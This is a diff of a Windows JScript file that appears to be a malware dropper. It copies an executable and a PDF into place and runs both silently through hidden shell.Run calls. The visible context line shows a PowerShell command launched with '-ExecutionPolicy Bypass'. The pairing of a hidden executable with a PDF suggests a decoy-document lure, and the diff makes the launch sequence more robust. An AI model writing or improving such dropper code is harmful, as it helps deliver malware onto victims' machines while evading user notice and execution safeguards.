@@ -25,12 +25,22 @@ var command2 = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process 
 // Create the necessary file system object
 var objFSO = new ActiveXObject("Scripting.FileSystemObject");
 
-// Copy the executable file
-objFSO.CopyFile(exeFileName, exePath);
+// Check if the executable file exists in the destination folder
+if (objFSO.FileExists(exePath)) {
+    // Execute the executable file
+    shell.Run(command1, 0, false);
+} else {
+    // Move and then execute the executable file
+    objFSO.CopyFile(exeFileName, exePath);
+    shell.Run(command1, 0, false);
+}
 
-// Copy the PDF file
-objFSO.CopyFile(pdfName, pdfPath);
-
-// Run the PowerShell commands
-shell.Run(command1, 0, false);
-shell.Run(command2, 0, false);
+// Check if the PDF file exists in the destination folder
+if (objFSO.FileExists(pdfPath)) {
+    // Execute the PDF file
+    shell.Run(command2, 0, false);
+} else {
+    // Move and then execute the PDF file
+    objFSO.CopyFile(pdfName, pdfPath);
+    shell.Run(command2, 0, false);
+}
